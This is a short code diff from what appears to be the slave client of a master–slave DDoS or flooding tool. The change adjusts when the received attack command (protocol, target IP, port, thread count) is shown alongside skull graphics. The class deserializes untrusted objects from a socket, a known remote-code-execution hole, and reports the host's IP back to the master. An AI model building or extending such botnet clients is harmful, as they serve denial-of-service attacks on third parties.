@@ -95,7 +95,7 @@ public class TurboFireSlave implements Serializable {
                 ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                 this.attackPattern = (AttackPattern) ois.readObject();
                 this.gui.showMessage("Command Received from Master!");
-                for(int i=1 ; i < 15 ; i++) {
+                for(int i=1 ; i < 16 ; i++) {
                     TimeUnit.SECONDS.sleep(1);
                     if(i%3 == 1) {
                         this.gui.clean();
@@ -109,13 +109,14 @@ public class TurboFireSlave implements Serializable {
                         this.gui.clean();
                         this.gui.showSkull();
                         this.gui.showMessage("Initializing Attack Operation ...");
+                    }else if(i == 15) {
+                        this.gui.showMessage(
+                            "Attack Command: " + this.attackPattern.getProtocol() + " | " + this.attackPattern.getIP() + " | " + 
+                            this.attackPattern.getPort() + " | " + this.attackPattern.getThreadAmount() + " | " +
+                            this.attackPattern.getMessage()
+                        );
                     }
                 }
-                this.gui.showMessage(
-                    "Attack Command: " + this.attackPattern.getProtocol() + " | " + this.attackPattern.getIP() + " | " + 
-                    this.attackPattern.getPort() + " | " + this.attackPattern.getThreadAmount() + " | " +
-                    this.attackPattern.getMessage()
-                    );
                 
                 ois.close();
                 this.attackPattern.setAdditionalInformation(Inet4Address.getLocalHost().getHostAddress().toString());
